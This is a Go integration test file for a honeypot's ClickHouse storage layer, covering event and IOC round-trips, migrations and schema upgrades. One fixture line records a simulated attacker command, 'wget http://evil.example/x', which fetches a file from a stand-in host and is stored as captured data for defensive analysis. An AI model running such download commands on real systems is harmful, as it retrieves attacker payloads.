package database

import (
	"context"
	"os"
	"strconv"
	"testing"
	"time"

	"github.com/qpot/qpot/internal/config"
)

// chTestConfig builds a DatabaseConfig from QPOT_TEST_CH_* env vars, skipping
// the test entirely when QPOT_TEST_CLICKHOUSE != 1. This keeps the integration
// test out of the normal unit run while letting us exercise the real driver.
func chTestConfig(t *testing.T) *config.DatabaseConfig {
	t.Helper()
	if os.Getenv("QPOT_TEST_CLICKHOUSE") != "1" {
		t.Skip("set QPOT_TEST_CLICKHOUSE=1 to run ClickHouse integration tests")
	}
	port := 9000
	if p := os.Getenv("QPOT_TEST_CH_PORT"); p != "" {
		port, _ = strconv.Atoi(p)
	}
	host := os.Getenv("QPOT_TEST_CH_HOST")
	if host == "" {
		host = "127.0.0.1"
	}
	return &config.DatabaseConfig{
		Type:     "clickhouse",
		Host:     host,
		Port:     port,
		Username: envOr("QPOT_TEST_CH_USER", "qpot"),
		Password: envOr("QPOT_TEST_CH_PASS", "qpotpass"),
		Database: envOr("QPOT_TEST_CH_DB", "qpot"),
	}
}

func envOr(k, d string) string {
	if v := os.Getenv(k); v != "" {
		return v
	}
	return d
}

func connectCH(t *testing.T) Database {
	t.Helper()
	db, err := New(chTestConfig(t))
	if err != nil {
		t.Fatalf("New: %v", err)
	}
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	defer cancel()
	if err := db.Connect(ctx); err != nil {
		t.Fatalf("Connect: %v", err)
	}
	if err := db.InitializeSchema(ctx); err != nil {
		t.Fatalf("InitializeSchema: %v", err)
	}
	t.Cleanup(func() { db.Close() })
	return db
}

// TestCHSourceIPHandling probes how the IPv4 source_ip column behaves with the
// range of values the honeypot pipeline actually produces: public IPv4, IPv6,
// empty, and malformed. This is exactly the case the data-pipeline audit
// flagged as a possible insert failure.
func TestCHSourceIPHandling(t *testing.T) {
	db := connectCH(t)
	ctx := context.Background()

	cases := []struct {
		name string
		ip   string
	}{
		{"ipv4", "203.0.113.7"},
		{"ipv6", "2001:db8::dead:beef"},
		{"empty", ""},
		{"malformed", "not-an-ip"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ev := &Event{
				Timestamp: time.Now().UTC(),
				Honeypot:  "cowrie",
				SourceIP:  c.ip,
				EventType: "login_failed",
				Username:  "root",
			}
			err := db.InsertEvent(ctx, ev)
			if err != nil {
				// Record the behavior; for ipv6/empty/malformed this documents
				// whether the IPv4 column rejects them (a real data-loss path).
				t.Logf("InsertEvent(source_ip=%q) FAILED: %v", c.ip, err)
			} else {
				t.Logf("InsertEvent(source_ip=%q) OK", c.ip)
			}
		})
	}
}

// TestCHRoundTrip verifies the core collect→store→read path against a real
// ClickHouse: insert events, then read them back and aggregate stats/IOCs.
func TestCHRoundTrip(t *testing.T) {
	db := connectCH(t)
	ctx := context.Background()
	since := time.Now().Add(-time.Hour)

	const n = 25
	evs := make([]*Event, n)
	for i := 0; i < n; i++ {
		evs[i] = &Event{
			Timestamp:  time.Now().UTC(),
			Honeypot:   "cowrie",
			SourceIP:   "198.51.100." + strconv.Itoa(i%254+1),
			SourcePort: 40000 + i,
			DestPort:   22,
			Protocol:   "ssh",
			EventType:  "command",
			Username:   "root",
			Command:    "wget http://evil.example/x" + strconv.Itoa(i),
			Metadata:   map[string]string{"k": "v"},
		}
	}
	if err := db.InsertEvents(ctx, evs); err != nil {
		t.Fatalf("InsertEvents: %v", err)
	}

	// ClickHouse inserts are async-flushed to disk but readable immediately on
	// the same connection; allow a brief moment regardless.
	time.Sleep(500 * time.Millisecond)

	got, err := db.GetEvents(ctx, EventFilter{Limit: 100, Honeypots: []string{"cowrie"}})
	if err != nil {
		t.Fatalf("GetEvents: %v", err)
	}
	if len(got) == 0 {
		t.Error("GetEvents returned 0 events after inserting 25")
	}
	for _, e := range got {
		if e.Honeypot != "cowrie" {
			t.Errorf("GetEvents honeypot filter leaked %q", e.Honeypot)
		}
		if e.EventType == "" {
			t.Error("read-back event has empty event_type")
		}
	}

	stats, err := db.GetStats(ctx, since)
	if err != nil {
		t.Fatalf("GetStats: %v", err)
	}
	if stats.TotalEvents <= 0 {
		t.Errorf("GetStats TotalEvents=%d, want >0", stats.TotalEvents)
	}

	// IOC path.
	ioc := &IOC{
		ID: "ip:198.51.100.5:cowrie", Type: "ip", Value: "198.51.100.5",
		Honeypot: "cowrie", SourceIP: "198.51.100.5",
		FirstSeen: time.Now().UTC(), LastSeen: time.Now().UTC(), Count: 1,
	}
	if err := db.InsertIOC(ctx, ioc); err != nil {
		t.Fatalf("InsertIOC: %v", err)
	}
	time.Sleep(300 * time.Millisecond)
	iocs, err := db.GetIOCs(ctx, IOCFilter{Limit: 10})
	if err != nil {
		t.Fatalf("GetIOCs: %v", err)
	}
	if len(iocs) == 0 {
		t.Error("GetIOCs returned 0 after inserting one")
	}
}

// Migrate must work on a fresh database (no schema_migrations table yet), and
// rolling back must actually lower the reported version.
func TestClickHouseMigrateUpAndDown(t *testing.T) {
	db := connectCH(t)
	ch := db.(*ClickHouse)
	ctx := context.Background()
	if err := ch.conn.Exec(ctx, `DROP TABLE IF EXISTS schema_migrations`); err != nil {
		t.Fatal(err)
	}
	mm := NewMigrationManager(db)
	for _, mig := range GetCoreMigrations() {
		mm.Register(mig)
	}
	if err := mm.Migrate(ctx); err != nil {
		t.Fatalf("Migrate: %v", err)
	}
	for _, step := range []int{2, 0, 3} {
		if err := mm.MigrateToVersion(ctx, step); err != nil {
			t.Fatalf("MigrateToVersion(%d): %v", step, err)
		}
		if v, _ := mm.GetCurrentVersion(ctx); v != step {
			t.Fatalf("after MigrateToVersion(%d) version = %d", step, v)
		}
	}
}

// Re-sighting an IOC appends another row to the ReplacingMergeTree; reads must
// still return it once (until a background merge, both rows are visible).
func TestClickHouseGetIOCsDeduplicates(t *testing.T) {
	db := connectCH(t)
	ch := db.(*ClickHouse)
	ctx := context.Background()
	if err := ch.conn.Exec(ctx, `TRUNCATE TABLE iocs`); err != nil {
		t.Fatal(err)
	}
	base := time.Now().UTC().Truncate(time.Millisecond)
	for i := 0; i < 3; i++ {
		ioc := &IOC{ID: "ip:198.51.100.77:cowrie", Type: "ip", Value: "198.51.100.77", Honeypot: "cowrie",
			FirstSeen: base, LastSeen: base.Add(time.Duration(i) * time.Second), Count: int64(i + 1)}
		if err := db.InsertIOC(ctx, ioc); err != nil {
			t.Fatal(err)
		}
	}
	got, err := db.GetIOCs(ctx, IOCFilter{Types: []string{"ip"}, Limit: 100})
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 1 {
		t.Fatalf("GetIOCs returned %d rows for one IOC, want 1", len(got))
	}
	if !got[0].LastSeen.Equal(base.Add(2 * time.Second)) {
		t.Fatalf("GetIOCs returned a stale version (last_seen %v)", got[0].LastSeen)
	}
}

// TagEvent must actually mark the event (with a sub-second timestamp, as real
// honeypot events have) so the worker stops re-fetching it.
func TestClickHouseTagEventMarksClassified(t *testing.T) {
	db := connectCH(t)
	ch := db.(*ClickHouse)
	ctx := context.Background()
	if err := ch.conn.Exec(ctx, `TRUNCATE TABLE events`); err != nil {
		t.Fatal(err)
	}
	ev := &Event{Timestamp: time.Now().UTC().Truncate(time.Millisecond).Add(123 * time.Millisecond),
		Honeypot: "cowrie", SourceIP: "203.0.113.44", EventType: "command", Command: "id"}
	if err := db.InsertEvent(ctx, ev); err != nil {
		t.Fatal(err)
	}
	un, err := db.GetUnclassifiedEvents(ctx, 10)
	if err != nil || len(un) != 1 {
		t.Fatalf("GetUnclassifiedEvents = %d, %v", len(un), err)
	}
	un[0].TechniqueID = "T1033"
	un[0].Classified = true
	if err := db.TagEvent(ctx, un[0]); err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(15 * time.Second)
	for {
		left, err := db.GetUnclassifiedEvents(ctx, 10)
		if err != nil {
			t.Fatal(err)
		}
		if len(left) == 0 {
			return
		}
		if time.Now().After(deadline) {
			t.Fatalf("event still unclassified after TagEvent (timestamp %v)", left[0].Timestamp)
		}
		time.Sleep(250 * time.Millisecond)
	}
}

func TestClickHouseIOCFilters(t *testing.T) {
	db := connectCH(t)
	if err := db.(*ClickHouse).conn.Exec(context.Background(), `TRUNCATE TABLE iocs`); err != nil {
		t.Fatal(err)
	}
	checkIOCValueAndSourceFilters(t, db, nil)
}

func TestClickHouseTagsSameMillisecondEventsSeparately(t *testing.T) {
	db := connectCH(t)
	ch := db.(*ClickHouse)
	if err := ch.conn.Exec(context.Background(), `ALTER TABLE events DELETE WHERE source_ip = '198.51.100.77' SETTINGS mutations_sync = 1`); err != nil {
		t.Fatal(err)
	}
	checkSameMillisecondTagging(t, db, "198.51.100.77", func() {})
}

// A pre-existing events table (no event_id) gains the column with values that
// are stable across reads, so its rows can be tagged.
func TestClickHouseEventIDUpgrade(t *testing.T) {
	db := connectCH(t)
	ch := db.(*ClickHouse)
	ctx := context.Background()
	if err := ch.conn.Exec(ctx, `ALTER TABLE events DROP COLUMN IF EXISTS event_id`); err != nil {
		t.Fatal(err)
	}
	if err := ch.conn.Exec(ctx, `TRUNCATE TABLE events`); err != nil {
		t.Fatal(err)
	}
	if err := ch.conn.Exec(ctx, `INSERT INTO events (timestamp, honeypot, source_ip, event_type) VALUES (now64(3), 'cowrie', '198.51.100.78', 'x')`); err != nil {
		t.Fatal(err)
	}
	if err := db.InitializeSchema(ctx); err != nil {
		t.Fatal(err)
	}
	var first string
	deadline := time.Now().Add(20 * time.Second)
	for {
		a, err := db.GetUnclassifiedEvents(ctx, 10)
		if err != nil {
			t.Fatal(err)
		}
		b, err := db.GetUnclassifiedEvents(ctx, 10)
		if err != nil {
			t.Fatal(err)
		}
		if len(a) == 1 && len(b) == 1 && a[0].ID == b[0].ID {
			first = a[0].ID
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("event_id not stable after upgrade: %v / %v", a, b)
		}
		time.Sleep(250 * time.Millisecond)
	}
	if first == "" || first == "00000000-0000-0000-0000-000000000000" {
		t.Fatalf("event_id = %q", first)
	}
}

// An events table created before categories existed gains the column on
// InitializeSchema: its rows read back with none and can then be tagged.
func TestClickHouseCategoriesUpgrade(t *testing.T) {
	db := connectCH(t)
	ch := db.(*ClickHouse)
	ctx := context.Background()
	if err := ch.conn.Exec(ctx, `ALTER TABLE events DROP COLUMN IF EXISTS categories`); err != nil {
		t.Fatal(err)
	}
	if err := ch.conn.Exec(ctx, `TRUNCATE TABLE events`); err != nil {
		t.Fatal(err)
	}
	if err := ch.conn.Exec(ctx, `INSERT INTO events (timestamp, honeypot, source_ip, event_type) VALUES (now64(3), 'cowrie', '198.51.100.79', 'cowrie.login.failed')`); err != nil {
		t.Fatal(err)
	}
	if err := db.InitializeSchema(ctx); err != nil {
		t.Fatal(err)
	}
	un, err := db.GetUnclassifiedEvents(ctx, 10)
	if err != nil || len(un) != 1 || un[0].Categories != nil {
		t.Fatalf("GetUnclassifiedEvents after upgrade = %+v, %v", un, err)
	}
	un[0].TechniqueID, un[0].Categories, un[0].Classified = "T1110", []string{"brute-force"}, true
	if err := db.(BatchTagger).TagEvents(ctx, un); err != nil {
		t.Fatal(err)
	}
	got, err := db.GetEvents(ctx, EventFilter{SourceIPs: []string{"198.51.100.79"}, Categories: []string{"brute-force"}, Limit: 10})
	if err != nil || len(got) != 1 || len(got[0].Categories) != 1 || got[0].Categories[0] != "brute-force" {
		t.Fatalf("GetEvents after tagging = %+v, %v", got, err)
	}
}

func TestClickHouseIOCSightingsAccumulate(t *testing.T) {
	db := connectCH(t)
	if err := db.(*ClickHouse).conn.Exec(context.Background(), `TRUNCATE TABLE iocs`); err != nil {
		t.Fatal(err)
	}
	checkIOCSightingsAccumulate(t, db, "198.51.100.90", func() {})
}
